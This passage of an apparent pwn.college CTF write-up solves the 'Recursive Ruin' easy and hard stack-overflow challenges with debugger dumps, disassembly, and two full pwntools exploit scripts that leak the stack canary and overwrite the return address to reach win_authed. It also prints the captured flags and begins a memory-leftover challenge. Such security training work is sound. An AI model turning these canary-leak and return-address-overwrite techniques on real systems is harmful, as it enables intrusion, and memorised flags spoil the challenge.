02:0010│-0a0 0x7ffc8036b590 —▸ 0x7ffc8036c768 —▸ 0x7ffc8036e677 ◂— '/challenge/recursive-ruin-easy'
03:0018│-098 0x7ffc8036b598 ◂— 0x17ee83723
04:0020│-090 0x7ffc8036b5a0 ◂— 0xd68 /* 'h\r' */
05:0028│-088 0x7ffc8036b5a8 ◂— 0x27ed26951
06:0030│-080 0x7ffc8036b5b0 ◂— 2
07:0038│-078 0x7ffc8036b5b8 —▸ 0x7ffc8036b5c0 ◂— 0x6161 /* 'aa' */
─────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x60963a011593 challenge+1973
   1   0x60963a0116c5 main+213
   2   0x71f57ecba083 __libc_start_main+243
   3   0x60963a01022e _start+46
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
```

We can see that the pointer expected substring is in `rsi` and that the substring is `REPEAT`.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *
import re

# Set context for 64-bit
context.arch = 'amd64'

p = process('/challenge/recursive-ruin-easy')

# Send "REPEAT" payload so that the challegne runs one more time
p.recvuntil(b'Payload size: ')
p.sendline(b'6')
p.recvuntil(b'bytes)!')
p.send(b'REPEAT')

# Capture the output containing all the addresses
output = p.recvuntil(b'Payload size: ')
output_str = output.decode()

# Extract relevant information
buf_addr = int(re.search(r"the input buffer starts at (0x[0-9a-fA-F]+)", output_str).group(1), 16)
canary_addr = int(re.search(r"the canary is stored at (0x[0-9a-fA-F]+)", output_str).group(1), 16)
canary_val = int(re.search(r"the canary value is now (0x[0-9a-fA-F]+)", output_str).group(1), 16)
ret_addr_at = int(re.search(r"the saved return address \(previously to main\) is at (0x[0-9a-fA-F]+)", output_str).group(1), 16)
win_authed_addr = int(re.search(r"the address of win_authed\(\) is (0x[0-9a-fA-F]+)", output_str).group(1), 16)

# Calculate address of instruction within win_authed() which skips authentication
safe_win_authed_offset = 28
safe_win_authed_addr = win_authed_addr + safe_win_authed_offset

# Calculate Offsets
offset_to_canary = canary_addr - buf_addr               # Distance from start of buffer to the canary
offset_to_ret = ret_addr_at - (canary_addr + 8)         # Distance from canary to the return address (usually 16 bytes: 8 for canary + 8 for RBP)

log.info(f"Buffer: {hex(buf_addr)} | Canary: {hex(canary_val)}")
log.info(f"Targeting: {hex(safe_win_authed_addr)}")

# Craft payload
payload = b"A" * offset_to_canary
payload += p64(canary_val)
payload += b"B" * offset_to_ret
payload += p64(safe_win_authed_addr)

# Send payload
p.sendline(str(len(payload)).encode())
p.recvuntil(b'bytes)!')
p.send(payload)

p.interactive()
```

```
hacker@program-security~recursive-ruin-easy:/$ python ~/script.py 
[+] Starting local process '/challenge/recursive-ruin-easy': pid 40384
[*] Buffer: 0x7ffef15f20c0 | Canary: 0xab7f5f7c7fd72d00
[*] Targeting: 0x5a652cee9cdd
[*] Switching to interactive mode

[*] Process '/challenge/recursive-ruin-easy' stopped with exit code -7 (SIGBUS) (pid 40384)
You sent 128 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffef15f1fc0 (rsp+0x0000) | a0 f6 35 59 a0 73 00 00 | 0x000073a05935f6a0 |
| 0x00007ffef15f1fc8 (rsp+0x0008) | 78 32 5f f1 fe 7f 00 00 | 0x00007ffef15f3278 |
| 0x00007ffef15f1fd0 (rsp+0x0010) | 68 32 5f f1 fe 7f 00 00 | 0x00007ffef15f3268 |
| 0x00007ffef15f1fd8 (rsp+0x0018) | 23 f7 35 59 01 00 00 00 | 0x000000015935f723 |
| 0x00007ffef15f1fe0 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffef15f1fe8 (rsp+0x0028) | 51 29 20 59 80 00 00 00 | 0x0000008059202951 |
| 0x00007ffef15f1ff0 (rsp+0x0030) | 80 00 00 00 00 00 00 00 | 0x0000000000000080 |
| 0x00007ffef15f1ff8 (rsp+0x0038) | 00 20 5f f1 fe 7f 00 00 | 0x00007ffef15f2000 |
| 0x00007ffef15f2000 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffef15f2008 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffef15f2010 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffef15f2018 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffef15f2020 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffef15f2028 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffef15f2030 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffef15f2038 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffef15f2040 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffef15f2048 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffef15f2050 (rsp+0x0090) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffef15f2058 (rsp+0x0098) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffef15f2060 (rsp+0x00a0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffef15f2068 (rsp+0x00a8) | 00 2d d7 7f 7c 5f 7f ab | 0xab7f5f7c7fd72d00 |
| 0x00007ffef15f2070 (rsp+0x00b0) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffef15f2078 (rsp+0x00b8) | dd 9c ee 2c 65 5a 00 00 | 0x00005a652cee9cdd |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffef15f2000
- the saved frame pointer (of main) is at 0x7ffef15f2070
- the saved return address (previously to main) is at 0x7ffef15f2078
- the saved return address is now pointing to 0x5a652cee9cdd.
- the canary is stored at 0x7ffef15f2068.
- the canary value is now 0xab7f5f7c7fd72d00.
- the address of win_authed() is 0x5a652cee9cc1.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win_authed() when it returns.
Let's try it now!

WARNING: You sent in too much data, and overwrote more than two bytes of the address.
         This can still work, because I told you the correct address to use for
         this execution, but you should not rely on that information.
         You can solve this challenge by only overwriting two bytes!
         
You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()
call to see the hidden backdoor!
Goodbye!
You win! Here is your flag:
pwn.college{crG2MXUQVih9CVfSLBT1Fk0y7hu.0VMxMDL4ITM0EzW}


[*] Got EOF while reading in interactive
$  
```

&nbsp;

## Recursive Ruin (Hard)

```
hacker@program-security~recursive-ruin-hard:/$ /challenge/recursive-ruin-hard 
###
### Welcome to /challenge/recursive-ruin-hard!
###

Payload size: 2
Send your payload (up to 2 bytes)!
aa
You said: aa
Goodbye!
### Goodbye!
```

This time, the program does not print any data. We will have to leak the stack canary using a [Buffer over-read](https://en.wikipedia.org/wiki/Buffer_over-read) as we did in [this level](#buffer-over-read).


We need the following information to craft our exploit:
- [ ] Location of buffer
- [ ] Location of canary
- [ ] Expected substring in order to loop the `challenge()` function
- [ ] Location of stored return address to `main()`
- [ ] Offset of instruction within `win_authed()` which skips the authentication


### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001110  __cxa_finalize@plt
0x0000000000001120  putchar@plt
0x0000000000001130  __errno_location@plt
0x0000000000001140  puts@plt
0x0000000000001150  write@plt
0x0000000000001160  __stack_chk_fail@plt
0x0000000000001170  printf@plt
0x0000000000001180  geteuid@plt
0x0000000000001190  read@plt
0x00000000000011a0  setvbuf@plt
0x00000000000011b0  open@plt
0x00000000000011c0  __isoc99_scanf@plt
0x00000000000011d0  exit@plt
0x00000000000011e0  strerror@plt
0x00000000000011f0  strstr@plt
0x0000000000001200  _start
0x0000000000001230  deregister_tm_clones
0x0000000000001260  register_tm_clones
0x00000000000012a0  __do_global_dtors_aux
0x00000000000012e0  frame_dummy
0x00000000000012e9  bin_padding
0x0000000000001419  win_authed
0x0000000000001536  challenge
0x0000000000001689  main
0x0000000000001790  __libc_csu_init
0x0000000000001800  __libc_csu_fini
0x0000000000001808  _fini
```

First, we can get the offset required instruction within `win_authed()`.

#### `win_authed()`

```
pwndbg> disassemble win_authed 
Dump of assembler code for function win_authed:
   0x0000000000001419 <+0>:     endbr64
   0x000000000000141d <+4>:     push   rbp
   0x000000000000141e <+5>:     mov    rbp,rsp
   0x0000000000001421 <+8>:     sub    rsp,0x10
   0x0000000000001425 <+12>:    mov    DWORD PTR [rbp-0x4],edi
   0x0000000000001428 <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
   0x000000000000142f <+22>:    jne    0x1533 <win_authed+282>
   0x0000000000001435 <+28>:    lea    rdi,[rip+0xbcc]        # 0x2008

# ---- snip ----

   0x0000000000001533 <+282>:   nop
   0x0000000000001534 <+283>:   leave
   0x0000000000001535 <+284>:   ret
End of assembler dump.
```

- [ ] Location of buffer
- [ ] Location of canary
- [ ] Expected substring in order to loop the `challenge()` function
- [ ] Location of stored return address to `main()`
- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1435`

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000001536 <+0>:     endbr64
   0x000000000000153a <+4>:     push   rbp
   0x000000000000153b <+5>:     mov    rbp,rsp
   0x000000000000153e <+8>:     sub    rsp,0x60
   0x0000000000001542 <+12>:    mov    DWORD PTR [rbp-0x44],edi
   0x0000000000001545 <+15>:    mov    QWORD PTR [rbp-0x50],rsi
   0x0000000000001549 <+19>:    mov    QWORD PTR [rbp-0x58],rdx
   0x000000000000154d <+23>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000001556 <+32>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000000155a <+36>:    xor    eax,eax
   0x000000000000155c <+38>:    mov    QWORD PTR [rbp-0x20],0x0
   0x0000000000001564 <+46>:    mov    QWORD PTR [rbp-0x18],0x0
   0x000000000000156c <+54>:    mov    QWORD PTR [rbp-0x10],0x0
   0x0000000000001574 <+62>:    lea    rax,[rbp-0x20]
   0x0000000000001578 <+66>:    mov    QWORD PTR [rbp-0x28],rax
   0x000000000000157c <+70>:    mov    QWORD PTR [rbp-0x30],0x0
   0x0000000000001584 <+78>:    lea    rdi,[rip+0xb81]        # 0x210c
   0x000000000000158b <+85>:    mov    eax,0x0
   0x0000000000001590 <+90>:    call   0x1170 <printf@plt>
   0x0000000000001595 <+95>:    lea    rax,[rbp-0x30]
   0x0000000000001599 <+99>:    mov    rsi,rax
   0x000000000000159c <+102>:   lea    rdi,[rip+0xb78]        # 0x211b
   0x00000000000015a3 <+109>:   mov    eax,0x0
   0x00000000000015a8 <+114>:   call   0x11c0 <__isoc99_scanf@plt>
   0x00000000000015ad <+119>:   mov    rax,QWORD PTR [rbp-0x30]
   0x00000000000015b1 <+123>:   mov    rsi,rax
   0x00000000000015b4 <+126>:   lea    rdi,[rip+0xb65]        # 0x2120
   0x00000000000015bb <+133>:   mov    eax,0x0
   0x00000000000015c0 <+138>:   call   0x1170 <printf@plt>
   0x00000000000015c5 <+143>:   mov    rdx,QWORD PTR [rbp-0x30]
   0x00000000000015c9 <+147>:   mov    rax,QWORD PTR [rbp-0x28]
   0x00000000000015cd <+151>:   mov    rsi,rax
   0x00000000000015d0 <+154>:   mov    edi,0x0
   0x00000000000015d5 <+159>:   call   0x1190 <read@plt>
   0x00000000000015da <+164>:   mov    DWORD PTR [rbp-0x34],eax
   0x00000000000015dd <+167>:   cmp    DWORD PTR [rbp-0x34],0x0
   0x00000000000015e1 <+171>:   jns    0x160f <challenge+217>
   0x00000000000015e3 <+173>:   call   0x1130 <__errno_location@plt>
   0x00000000000015e8 <+178>:   mov    eax,DWORD PTR [rax]
   0x00000000000015ea <+180>:   mov    edi,eax
   0x00000000000015ec <+182>:   call   0x11e0 <strerror@plt>
   0x00000000000015f1 <+187>:   mov    rsi,rax
   0x00000000000015f4 <+190>:   lea    rdi,[rip+0xb4d]        # 0x2148
   0x00000000000015fb <+197>:   mov    eax,0x0
   0x0000000000001600 <+202>:   call   0x1170 <printf@plt>
   0x0000000000001605 <+207>:   mov    edi,0x1
   0x000000000000160a <+212>:   call   0x11d0 <exit@plt>
   0x000000000000160f <+217>:   mov    rax,QWORD PTR [rbp-0x28]
   0x0000000000001613 <+221>:   mov    rsi,rax
   0x0000000000001616 <+224>:   lea    rdi,[rip+0xb4f]        # 0x216c
   0x000000000000161d <+231>:   mov    eax,0x0
   0x0000000000001622 <+236>:   call   0x1170 <printf@plt>
   0x0000000000001627 <+241>:   mov    rax,QWORD PTR [rbp-0x28]
   0x000000000000162b <+245>:   lea    rsi,[rip+0xb48]        # 0x217a
   0x0000000000001632 <+252>:   mov    rdi,rax
   0x0000000000001635 <+255>:   call   0x11f0 <strstr@plt>
   0x000000000000163a <+260>:   test   rax,rax
   0x000000000000163d <+263>:   je     0x1662 <challenge+300>
   0x000000000000163f <+265>:   lea    rdi,[rip+0xb42]        # 0x2188
   0x0000000000001646 <+272>:   call   0x1140 <puts@plt>
   0x000000000000164b <+277>:   mov    rdx,QWORD PTR [rbp-0x58]
   0x000000000000164f <+281>:   mov    rcx,QWORD PTR [rbp-0x50]
   0x0000000000001653 <+285>:   mov    eax,DWORD PTR [rbp-0x44]
   0x0000000000001656 <+288>:   mov    rsi,rcx
   0x0000000000001659 <+291>:   mov    edi,eax
   0x000000000000165b <+293>:   call   0x1536 <challenge>
   0x0000000000001660 <+298>:   jmp    0x1673 <challenge+317>
   0x0000000000001662 <+300>:   lea    rdi,[rip+0xb49]        # 0x21b2
   0x0000000000001669 <+307>:   call   0x1140 <puts@plt>
   0x000000000000166e <+312>:   mov    eax,0x0
   0x0000000000001673 <+317>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000001677 <+321>:   xor    rcx,QWORD PTR fs:0x28
   0x0000000000001680 <+330>:   je     0x1687 <challenge+337>
   0x0000000000001682 <+332>:   call   0x1160 <__stack_chk_fail@plt>
   0x0000000000001687 <+337>:   leave
   0x0000000000001688 <+338>:   ret
End of assembler dump.
```

Let's set breakpoints at `challenge+159` and `challenge+255` and run in order to get the address of the buffer and the expected substring.

```
pwndbg> break *(challenge+159)
Breakpoint 1 at 0x15d5
```

```
pwndbg> break *(challenge+255)
Breakpoint 2 at 0x1635
```

```
pwndbg> run
Starting program: /challenge/recursive-ruin-hard 
###
### Welcome to /challenge/recursive-ruin-hard!
###

Payload size: 2
Send your payload (up to 2 bytes)!

Breakpoint 1, 0x00005d7f985835d5 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x7fff92176c60 ◂— 0
 RBX  0x5d7f98583790 (__libc_csu_init) ◂— endbr64 
 RCX  0
 RDX  2
 RDI  0
 RSI  0x7fff92176c60 ◂— 0
 R8   0x23
 R9   0x23
 R10  0x5d7f9858413c ◂— ' bytes)!\n'
 R11  0x246
 R12  0x5d7f98583200 (_start) ◂— endbr64 
 R13  0x7fff92177db0 ◂— 1
 R14  0
 R15  0
 RBP  0x7fff92176c80 —▸ 0x7fff92177cc0 ◂— 0
 RSP  0x7fff92176c20 —▸ 0x76b494d5e540 ◂— 0x76b494d5e540
 RIP  0x5d7f985835d5 (challenge+159) ◂— call read@plt
──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x5d7f985835d5 <challenge+159>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7fff92176c60 ◂— 0
        nbytes: 2
 
   0x5d7f985835da <challenge+164>    mov    dword ptr [rbp - 0x34], eax
   0x5d7f985835dd <challenge+167>    cmp    dword ptr [rbp - 0x34], 0
   0x5d7f985835e1 <challenge+171>    jns    challenge+217               <challenge+217>
 
   0x5d7f985835e3 <challenge+173>    call   __errno_location@plt        <__errno_location@plt>
 
   0x5d7f985835e8 <challenge+178>    mov    eax, dword ptr [rax]
   0x5d7f985835ea <challenge+180>    mov    edi, eax
   0x5d7f985835ec <challenge+182>    call   strerror@plt                <strerror@plt>
 
   0x5d7f985835f1 <challenge+187>    mov    rsi, rax
   0x5d7f985835f4 <challenge+190>    lea    rdi, [rip + 0xb4d]     RDI => 0x5d7f98584148 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x5d7f985835fb <challenge+197>    mov    eax, 0                 EAX => 0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fff92176c20 —▸ 0x76b494d5e540 ◂— 0x76b494d5e540
01:0008│-058 0x7fff92176c28 —▸ 0x7fff92177dc8 —▸ 0x7fff92178696 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-050 0x7fff92176c30 —▸ 0x7fff92177db8 —▸ 0x7fff92178677 ◂— '/challenge/recursive-ruin-hard'
03:0018│-048 0x7fff92176c38 ◂— 0x194bfbe93
04:0020│-040 0x7fff92176c40 —▸ 0x76b494d586a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0028│-038 0x7fff92176c48 ◂— 0xa /* '\n' */
06:0030│-030 0x7fff92176c50 ◂— 2
07:0038│-028 0x7fff92176c58 —▸ 0x7fff92176c60 ◂— 0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5d7f985835d5 challenge+159
   1   0x5d7f9858375e main+213
   2   0x76b494b8f083 __libc_start_main+243
   3   0x5d7f9858322e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of buffer: `0x7fff92176c60`
- [ ] Location of canary
- [ ] Expected substring in order to loop the `challenge()` function
- [ ] Location of stored return address to `main()`
- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1435`

Let's get the location of the canary as well.

```
pwndbg> x/40gx $rsi
0x7fff92176c60: 0x0000000000000000      0x0000000000000000
0x7fff92176c70: 0x0000000000000000      0x59db68b7f07ee600
0x7fff92176c80: 0x00007fff92177cc0      0x00005d7f9858375e
0x7fff92176c90: 0x0000000000001000      0x00007fff92177dc8
0x7fff92176ca0: 0x00007fff92177db8      0x00000001001e8788
0x7fff92176cb0: 0x00000000001e8788      0x0000000000005018
0x7fff92176cc0: 0x0000000000008ed8      0x0000000000001000
0x7fff92176cd0: 0x0000000600000002      0x00000000001eab80
0x7fff92176ce0: 0x00000000001ebb80      0x00000000001ebb80
0x7fff92176cf0: 0x00000000000001e0      0x00000000000001e0
0x7fff92176d00: 0x0000000000000008      0x0000000400000004
0x7fff92176d10: 0x0000000000000350      0x0000000000000350
0x7fff92176d20: 0x0000000000000350      0x0000000000000020
0x7fff92176d30: 0x0000000000000020      0x0000000000000008
0x7fff92176d40: 0x0000000400000004      0x0000000000000370
0x7fff92176d50: 0x0000000000000370      0x0000000000000370
0x7fff92176d60: 0x0000000000000044      0x0000000000000044
0x7fff92176d70: 0x0000000000000004      0x0000000400000007
0x7fff92176d80: 0x00000000001e7788      0x00000000001e8788
0x7fff92176d90: 0x00000000001e8788      0x0000000000000010
```

We can infer that the value at `0x7fff92176c78` is the canary because of the leading `\x00` byte.

- [x] Location of buffer: `0x7fff92176c60`
- [x] Location of canary: `0x7fff92176c78`
- [ ] Expected substring in order to loop the `challenge()` function
- [ ] Location of stored return address to `main()`
- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1435`

```
pwndbg> info frame
Stack level 0, frame at 0x7fff92176c90:
 rip = 0x5d7f985835d5 in challenge; saved rip = 0x5d7f9858375e
 called by frame at 0x7fff92177cd0
 Arglist at 0x7fff92176c80, args: 
 Locals at 0x7fff92176c80, Previous frame's sp is 0x7fff92176c90
 Saved registers:
  rbp at 0x7fff92176c80, rip at 0x7fff92176c88
```

- [x] Location of buffer: `0x7fff92176c60`
- [x] Location of canary: `0x7fff92176c78`
- [ ] Expected substring in order to loop the `challenge()` function
- [x] Location of stored return address to `main()`: `0x7fff92176c88`
- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1435`

Let's continue.

```
pwndbg> c
Continuing.
aa
You said: aa

Breakpoint 2, 0x00005d7f98583635 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x7fff92176c60 ◂— 0x6161 /* 'aa' */
 RBX  0x5d7f98583790 (__libc_csu_init) ◂— endbr64 
 RCX  0
*RDX  0
*RDI  0x7fff92176c60 ◂— 0x6161 /* 'aa' */
*RSI  0x5d7f9858417a ◂— 0x544145504552 /* 'REPEAT' */
*R8   0xd
*R9   0xd
*R10  0x5d7f98584178 ◂— 0x544145504552000a /* '\n' */
 R11  0x246
 R12  0x5d7f98583200 (_start) ◂— endbr64 
 R13  0x7fff92177db0 ◂— 1
 R14  0
 R15  0
 RBP  0x7fff92176c80 —▸ 0x7fff92177cc0 ◂— 0
 RSP  0x7fff92176c20 —▸ 0x76b494d5e540 ◂— 0x76b494d5e540
*RIP  0x5d7f98583635 (challenge+255) ◂— call strstr@plt
──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x5d7f98583635 <challenge+255>    call   strstr@plt                  <strstr@plt>
        haystack: 0x7fff92176c60 ◂— 0x6161 /* 'aa' */
        needle: 0x5d7f9858417a ◂— 0x544145504552 /* 'REPEAT' */
 
   0x5d7f9858363a <challenge+260>    test   rax, rax
   0x5d7f9858363d <challenge+263>    je     challenge+300               <challenge+300>
 
   0x5d7f9858363f <challenge+265>    lea    rdi, [rip + 0xb42]     RDI => 0x5d7f98584188 ◂— 'Backdoor triggered! Repeating challenge()'
   0x5d7f98583646 <challenge+272>    call   puts@plt                    <puts@plt>
 
   0x5d7f9858364b <challenge+277>    mov    rdx, qword ptr [rbp - 0x58]
   0x5d7f9858364f <challenge+281>    mov    rcx, qword ptr [rbp - 0x50]
   0x5d7f98583653 <challenge+285>    mov    eax, dword ptr [rbp - 0x44]
   0x5d7f98583656 <challenge+288>    mov    rsi, rcx
   0x5d7f98583659 <challenge+291>    mov    edi, eax
   0x5d7f9858365b <challenge+293>    call   challenge                   <challenge>
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fff92176c20 —▸ 0x76b494d5e540 ◂— 0x76b494d5e540
01:0008│-058 0x7fff92176c28 —▸ 0x7fff92177dc8 —▸ 0x7fff92178696 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-050 0x7fff92176c30 —▸ 0x7fff92177db8 —▸ 0x7fff92178677 ◂— '/challenge/recursive-ruin-hard'
03:0018│-048 0x7fff92176c38 ◂— 0x194bfbe93
04:0020│-040 0x7fff92176c40 —▸ 0x76b494d586a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0028│-038 0x7fff92176c48 ◂— 0x20000000a /* '\n' */
06:0030│-030 0x7fff92176c50 ◂— 2
07:0038│-028 0x7fff92176c58 —▸ 0x7fff92176c60 ◂— 0x6161 /* 'aa' */
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5d7f98583635 challenge+255
   1   0x5d7f9858375e main+213
   2   0x76b494b8f083 __libc_start_main+243
   3   0x5d7f9858322e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of buffer: `0x7fff92176c60`
- [x] Location of canary: `0x7fff92176c78`
- [x] Expected substring in order to loop the `challenge()` function: `REPEAT`
- [x] Location of stored return address to `main()`: `0x7fff92176c88`
- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1435`


### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

# Initialize data
buffer_addr = 0x7fff92176c60
canary_addr = 0x7fff92176c78
addr_of_saved_ip = 0x7fff92176c88
safe_win_auth_offset = 0x1435

attempt = 0

while True:
    attempt += 1
    p = process('/challenge/recursive-ruin-hard')
    
    try:
        # Standard offsets for this challenge level
        offset_to_canary = canary_addr - buffer_addr               # Distance from start of buffer to the canary

        # --- STAGE 1: LEAK ---
        p.recvuntil(b'Payload size: ')
        p.sendline(str(offset_to_canary + 1).encode())

        payload = b'REPEAT'
        payload += b'A' * (offset_to_canary - 6)
        payload += b'B' 

        p.recvuntil(b'bytes)!')
        p.send(payload)

        # Grab the leak
        p.recvuntil(b'AAAAAB')
        canary_raw = p.recv(7)
        canary = u64(canary_raw.rjust(8, b'\x00'))

        # --- STAGE 2: EXPLOIT ---
        offset_to_ret = addr_of_saved_ip - (canary_addr + 8)         # Distance from canary to the return address (usually 16 bytes: 8 for canary + 8 for RBP) 

        p.recvuntil(b'Payload size: ')
        
        # Build payload: [Padding] + [Canary] + [RBP Padding] + [RIP Partial]
        exploit = b"A" * offset_to_canary
        exploit += p64(canary)
        exploit += b"B" * offset_to_ret
        exploit += struct.pack("<H", safe_win_auth_offset)

        p.sendline(str(len(exploit)).encode())
        p.recvuntil(b'bytes)!')
        p.send(exploit)

        # Increase timeout slightly to allow the flag to print
        output = p.recvall(timeout=1).decode(errors="ignore")
        
        if "pwn.college{" in output:
            print(f"!!! FLAG FOUND ON ATTEMPT {attempt} !!!")
            print(output)
            break

    except EOFError:
        pass
    finally:
        p.close()
```

```
hacker@program-security~recursive-ruin-hard:/$ python ~/script.py 
!!! FLAG FOUND ON ATTEMPT 11 !!!

You said: AAAAAAAAAAAAAAAAAAAAAAAA
Goodbye!
You win! Here is your flag:
pwn.college{4wIXepUmd8EUH6XrDzc8BNIhTJ1.0lMxMDL4ITM0EzW}
```

&nbsp;

## Lingering Leftover (Easy)

```
hacker@program-security~lingering-leftover-easy:/$ /challenge/lingering-leftover-easy 
###
### Welcome to /challenge/lingering-leftover-easy!
###

This challenge reads the flag file to verify it. Do you think this might leave traces of the flag around afterwards?

The flag was read into address 0x7fff5f3295f6.

The challenge() function has just been launched!
However... An important initialization step was missed.
Use this to your advantage!

Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fff5f3294c0 (rsp+0x0000) | 10 00 00 00 30 00 00 00 | 0x0000003000000010 |
| 0x00007fff5f3294c8 (rsp+0x0008) | 48 a8 32 5f ff 7f 00 00 | 0x00007fff5f32a848 |
| 0x00007fff5f3294d0 (rsp+0x0010) | 38 a8 32 5f ff 7f 00 00 | 0x00007fff5f32a838 |
| 0x00007fff5f3294d8 (rsp+0x0018) | 00 6d fd bf 01 00 00 00 | 0x00000001bffd6d00 |
| 0x00007fff5f3294e0 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3294e8 (rsp+0x0028) | f6 95 32 5f ff 7f 00 00 | 0x00007fff5f3295f6 |
| 0x00007fff5f3294f0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3294f8 (rsp+0x0038) | 00 95 32 5f ff 7f 00 00 | 0x00007fff5f329500 |
| 0x00007fff5f329500 (rsp+0x0040) | 76 00 00 00 00 00 00 00 | 0x0000000000000076 |
| 0x00007fff5f329508 (rsp+0x0048) | 33 00 00 00 00 00 00 00 | 0x0000000000000033 |
| 0x00007fff5f329510 (rsp+0x0050) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007fff5f329518 (rsp+0x0058) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
| 0x00007fff5f329520 (rsp+0x0060) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
| 0x00007fff5f329528 (rsp+0x0068) | f8 d1 1f e6 c6 60 00 00 | 0x000060c6e61fd1f8 |
| 0x00007fff5f329530 (rsp+0x0070) | 20 00 20 e6 c6 60 00 00 | 0x000060c6e6200020 |
| 0x00007fff5f329538 (rsp+0x0078) | a0 b4 d9 58 7a 73 00 00 | 0x0000737a58d9b4a0 |
| 0x00007fff5f329540 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f329548 (rsp+0x0088) | 93 2e c4 58 7a 73 00 00 | 0x0000737a58c42e93 |
| 0x00007fff5f329550 (rsp+0x0090) | 75 00 00 00 00 00 00 00 | 0x0000000000000075 |
